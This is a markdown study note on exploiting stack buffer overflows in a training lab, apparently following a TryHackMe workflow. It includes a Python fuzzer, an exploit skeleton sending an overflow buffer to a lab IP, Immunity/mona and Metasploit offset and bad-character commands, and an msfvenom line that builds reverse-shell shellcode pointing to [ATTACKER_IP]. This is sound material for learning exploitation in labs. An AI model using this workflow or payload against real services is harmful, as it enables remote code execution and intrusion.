---
title: 3 - Buffer Overflow
summary: Gaining Access step – a note for Buffer Overflows.
description: Gaining Access step – a note for Buffer Overflows.
---

# Memory Architecture

---

## Memory

![killchain-buffer_overflow-architecture-memory.png](../attachments/killchain-buffer_overflow-architecture-memory.png)
Source: TCM Security

## Stack

![killchain-buffer_overflow-architecture-stack.png](../attachments/killchain-buffer_overflow-architecture-stack.png)
Source: TCM Security

# Basis

---

 > 
 > **<font color=red>python -c "print('A' \*</font> 40 <font color=red>+ '</font>\\xef\xbe\xad\xde<font color=red>')"</font>**</br>
 > Print payload with overflow and value to inject.

 > 
 > **<font color=red>cat</font> myPayloadFile <font color=red>- |</font> vulnerableBinary**</br>
 > Use `-` to hang after succefull buffer overflow. 

# THM Method

---

## 1 - Fuzzing

 > 
 > **<font color=red>1_fuzzer.py</font>**</br>

````py
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.99.64"
port = 1337

timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)

````

## 2 - Controlling EIP (Finding Offset)

### Method 1: Manual

 > 
 > **<font color=red>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l</font> 3000**</br>
 > Create chars to find EIP (maki it 400 bytes longer than the string that crashed the server).

 > 
 > Take that string of chars and put it in "payload" variable in 2_exploit.py.

 > 
 > Re-run the program in Immunity.

 > 
 > **<font color=red>2_exploit.py</font>**</br>

````py
import socket

ip = "10.10.99.64"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3 ..." # HERE !
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
````

 > 
 > Look at EIP Value (Immunity > Registers (in CPU Window))
 > ![exploit-buffer_overflow-eip_manual.png](../attachments/exploit-buffer_overflow-eip_manual.png)

 > 
 > **<font color=red>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l</font> 3000 <font color=red>-q</font> 386F4337**</br>
 > Return the exact offset.

 > 
 > Take that offset and put it in "offset" variable in 2_exploit.py.

 > 
 > Set "payload" variable to "" (empty).

 > 
 > Set "retn" variable to "BBBB" (EIP overwrite).

### Method 2: Mona

Immunity : !mona findmsp -distance 2400

→ EIP contains normal pattern : 0x6f43396e (offset 1978)

![exploit-buffer_overflow-eip_mona.png](../attachments/exploit-buffer_overflow-eip_mona.png)

## 3 - Finding Bad characters

### Method 1: Manual

 > 
 > **<font color=red>!mona bytearray -b "</font>\\x00<font color=red>"</font>**</br>
 > In Immunity

 > 
 > <font color=red>
**3_gen_badchars.py**</font></br>

````py
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
````

 > 
 > Take output form `3_gen_badchars.py` and put il in "payload" variable in `2_exploit.py`.

 > 
 > **<font color=red>2_exploit.py</font>**</br>

 > 
 > Follow EIP in Immunity.
 > ![exploit-buffer_overflow-bad_chars_manual_1.png](../attachments/exploit-buffer_overflow-bad_chars_manual_1.png)

 > 
 > Check if all chars are here in right order.
 > ![exploit-buffer_overflow-bad_chars_manual_2.png](../attachments/exploit-buffer_overflow-bad_chars_manual_2.png)

 > 
 > Notes : 
 > 
 > * Bad chars will not necessarily be B0.
 > * When there are consecutive bad chars, the only bad is the first one (but we can remove them by precaution).

### Method 2: Mona

 > 
 > **<font color=red>!mona config -set workingfolder</font> c:\mona**</br>
 > Set where mona will save data.

 > 
 > **<font color=red>!mona bytearray -cpb</font> “\x00”**</br>
 > Generate Bytearray

 > 
 > **<font color=red>!mona compare -f</font> bytearray.bin <font color=red>-a</font> ESP-ADDR**</br>
 > Find bad chars.

![exploit-buffer_overflow-bad_chars_mona.png](../attachments/exploit-buffer_overflow-bad_chars_mona.png)

Do it again adding bad chars :

 > 
 > **<font color=red>!mona bytearray -cpb</font> "\x00\x07\x08\x2e\x2f\xa0\xa1"**</br>
 > Generate Byte array.

## 4 - Find Jump Point

### Method 1: Manual

 > 
 > Set "retn" variable to the jump point (backward because of little endian).
 > Ex :  0x01020304 -> "\x04\x03\x02\x01

### Method 2: Mona

 > 
 > **<font color=red>!mona jmp -r esp -cpb </font>"\x00\x07\x08\x2e\x2f\xa0\xa1"**</br>
 > Return all "jmp esp" (specify bad chars after -cpb).

![exploit-buffer_overflow-jump_point_mona.png](../attachments/exploit-buffer_overflow-jump_point_mona.png)

## 5 - Generate Shellcode (MSFVNOM)


 > 
 > **<font color=red>msfvenom -p</font> windows/shell_reverse_tcp <font color=red>LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>EXITFUNC=thread -f</font> c <font color=red>-b "</font>\\x00\x07\x08\x2e\x2f\xa0\xa1<font color=red>"</font>**</br>
 > Gen Reverse Shell in Shellcode (specify bad chars).

#### Flags

 > 
 > **<font color=red>-b "</font>\\x00<font color=red>"</font>**</br>
 > Specify bad characters (always put at least null byte).
 > 
 > **<font color=red>-f</font> c**</br>
 > File Type (here it's c file).
 > 
 > **<font color=red>-a</font> x86**</br>
 > Architecture.
